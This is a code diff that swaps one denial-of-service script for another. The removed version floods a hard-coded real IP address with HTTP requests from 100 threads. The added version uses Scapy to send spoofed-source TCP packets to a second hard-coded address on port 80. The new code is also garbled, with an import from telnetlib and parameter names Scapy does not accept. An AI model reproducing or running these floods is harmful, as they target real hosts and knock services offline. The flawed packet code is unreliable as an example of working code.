@@ -1,35 +1,21 @@
-import socket
-import threading
+import random
+from telnetlib import IP
+from scapy.all import *
+target_IP = "104.21.14.203"
+i = 1
 
-
-target = '162.255.119.15'
-fake_ip = '182.21.20.32'
-port = 80
-
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        s.close() 
-
-for i in range(100):
-    thread = threading.Thread(target=attack)
-    thread.start()
-
-
-attack_num = 0
-
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        
-        global attack_num
-        attack_num += 1
-        print(attack_num)
-        
-        s.close()
+while True:
+   a = str(random.randint(1,254))
+   b = str(random.randint(1,254))
+   c = str(random.randint(1,254))
+   d = str(random.randint(1,254))
+   dot = "."
+   source_IP = a + dot + b + dot + c + dot + d
+   
+   for source_port in range(1, 65535):
+    IP1 = IP(source_IP = source_IP, destination = target_IP)
+    TCP1 = TCP(srcport = source_port, dstport = 80)
+    pkt = IP1 / TCP1
+    send(pkt,inter = .001)  
+    print ("packet sent ", i)
+    i = i + 1
